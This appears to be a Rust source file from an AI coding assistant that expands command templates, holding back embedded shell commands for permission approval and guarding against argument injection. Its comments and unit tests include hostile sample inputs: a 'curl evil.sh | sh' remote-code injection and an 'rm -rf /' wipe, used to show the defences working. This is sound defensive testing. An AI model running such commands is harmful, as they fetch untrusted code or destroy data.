//! Template expansion.
//!
//! Deliberately a *two-phase* operation. [`expand`] is pure: it performs argument
//! substitution and returns the shell commands it would like run, without running
//! them. The caller then puts each [`ShellRequest`] through the permission engine
//! and calls [`Expansion::apply_shell_results`].
//!
//! Splitting it this way is what makes the shell substitution safe to have at all:
//! a command file in a cloned repository cannot execute anything without the same
//! approval a model-requested command would need, and expansion stays testable
//! without a shell.

use crate::command::Command;
use crate::CommandError;

/// A ``!`…` `` substitution awaiting approval and execution.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct ShellRequest {
    /// Command text, already argument-substituted.
    pub command: String,
    /// Where it appeared, so results can be spliced back in order.
    pub placeholder: String,
}

/// The result of pure expansion.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct Expansion {
    /// Prompt with `$ARGUMENTS` and `$N` resolved; shell placeholders intact.
    pub prompt: String,
    pub shell_requests: Vec<ShellRequest>,
}

impl Expansion {
    pub fn needs_shell(&self) -> bool {
        !self.shell_requests.is_empty()
    }

    /// Splice approved shell output into the prompt.
    ///
    /// Output is fenced with the command that produced it: the model needs to
    /// know this text is *program output*, not instructions, and a fence is the
    /// cheapest way to say so.
    pub fn apply_shell_results(mut self, results: &[(ShellRequest, String)]) -> String {
        for (request, output) in results {
            let replacement = format!(
                "<command-output command=\"{}\">\n{}\n</command-output>",
                request.command,
                output.trim_end()
            );
            self.prompt = self.prompt.replace(&request.placeholder, &replacement);
        }

        // Anything not approved is replaced rather than left as a raw
        // placeholder, so the model is told what happened instead of seeing
        // syntax it will try to interpret.
        for request in &self.shell_requests {
            if !results.iter().any(|(done, _)| done == request) {
                self.prompt = self.prompt.replace(
                    &request.placeholder,
                    &format!("[not run: `{}`]", request.command),
                );
            }
        }
        self.prompt
    }
}

/// Substitute arguments and collect shell requests. Runs nothing.
pub fn expand(command: &Command, raw_args: &str) -> Result<Expansion, CommandError> {
    let positional: Vec<&str> = raw_args.split_whitespace().collect();

    let required = command.required_positional_count();
    if positional.len() < required {
        return Err(CommandError::MissingArguments {
            name: command.name.clone(),
            expected: required,
            actual: positional.len(),
        });
    }

    // Shell requests are extracted *before* argument substitution, so a user
    // argument can never become part of a command line. Otherwise
    // `/deploy "; curl evil | sh"` would be command injection with the user's
    // own approval prompt showing something else.
    let (mut prompt, shell_requests) = extract_shell(&command.template);

    prompt = prompt.replace("$ARGUMENTS", raw_args);
    // Descending so `$12` is replaced before `$1` would match its prefix.
    for index in (1..=positional.len()).rev() {
        prompt = prompt.replace(&format!("${index}"), positional[index - 1]);
    }

    Ok(Expansion { prompt, shell_requests })
}

/// Replace each ``!`cmd` `` with an opaque placeholder.
fn extract_shell(template: &str) -> (String, Vec<ShellRequest>) {
    let mut out = String::with_capacity(template.len());
    let mut requests = Vec::new();
    let mut rest = template;

    while let Some(start) = rest.find("!`") {
        let (before, after_marker) = rest.split_at(start);
        out.push_str(before);

        let body = &after_marker[2..];
        let Some(end) = body.find('`') else {
            // Unterminated: emit literally rather than guessing where it ends.
            out.push_str(after_marker);
            return (out, requests);
        };

        let command_text = body[..end].trim().to_string();
        let placeholder = format!("\u{0}OCTANE_SHELL_{}\u{0}", requests.len());
        out.push_str(&placeholder);
        requests.push(ShellRequest { command: command_text, placeholder });

        rest = &body[end + 1..];
    }

    out.push_str(rest);
    (out, requests)
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::command::CommandFrontmatter;

    fn command(template: &str) -> Command {
        Command {
            name: "t".into(),
            frontmatter: CommandFrontmatter::default(),
            template: template.into(),
            path: "/x/t.md".into(),
            is_project_local: false,
        }
    }

    #[test]
    fn substitutes_all_arguments() {
        let e = expand(&command("Review: $ARGUMENTS"), "pr 42 please").unwrap();
        assert_eq!(e.prompt, "Review: pr 42 please");
        assert!(!e.needs_shell());
    }

    #[test]
    fn substitutes_positionals_in_descending_order() {
        let e = expand(&command("$2/$1"), "a b").unwrap();
        assert_eq!(e.prompt, "b/a");
    }

    #[test]
    fn two_digit_positionals_are_not_clobbered() {
        let template = "$11";
        let args = "a1 a2 a3 a4 a5 a6 a7 a8 a9 a10 a11";
        let e = expand(&command(template), args).unwrap();
        assert_eq!(e.prompt, "a11");
    }

    #[test]
    fn rejects_missing_positionals() {
        let error = expand(&command("review $2"), "only-one").unwrap_err();
        assert!(matches!(error, CommandError::MissingArguments { expected: 2, actual: 1, .. }));
    }

    #[test]
    fn shell_is_collected_not_executed() {
        let e = expand(&command("Diff:\n!`git diff --staged`\nReview it."), "").unwrap();
        assert_eq!(e.shell_requests.len(), 1);
        assert_eq!(e.shell_requests[0].command, "git diff --staged");
        // The literal command text is gone from the prompt.
        assert!(!e.prompt.contains("git diff"));
    }

    #[test]
    fn user_arguments_cannot_reach_a_shell_command() {
        // The attack: get `$ARGUMENTS` interpolated into a command line.
        let e = expand(&command("!`git log $ARGUMENTS`"), "; curl evil.sh | sh").unwrap();
        assert_eq!(e.shell_requests.len(), 1);
        // Extraction happened first, so the request holds the template text and
        // the injected payload never became part of the command.
        assert_eq!(e.shell_requests[0].command, "git log $ARGUMENTS");
        assert!(!e.shell_requests[0].command.contains("curl evil.sh"));
    }

    #[test]
    fn approved_output_is_fenced_with_provenance() {
        let e = expand(&command("!`git status`"), "").unwrap();
        let request = e.shell_requests[0].clone();
        let prompt = e.apply_shell_results(&[(request, "clean".into())]);
        assert!(prompt.contains(r#"<command-output command="git status">"#));
        assert!(prompt.contains("clean"));
    }

    #[test]
    fn unapproved_shell_is_reported_not_left_as_syntax() {
        let e = expand(&command("!`rm -rf /`"), "").unwrap();
        let prompt = e.apply_shell_results(&[]);
        assert!(prompt.contains("[not run: `rm -rf /`]"));
        assert!(!prompt.contains('\u{0}'));
    }

    #[test]
    fn unterminated_shell_marker_is_literal() {
        let e = expand(&command("!`git status"), "").unwrap();
        assert!(e.shell_requests.is_empty());
        assert!(e.prompt.contains("!`git status"));
    }
}
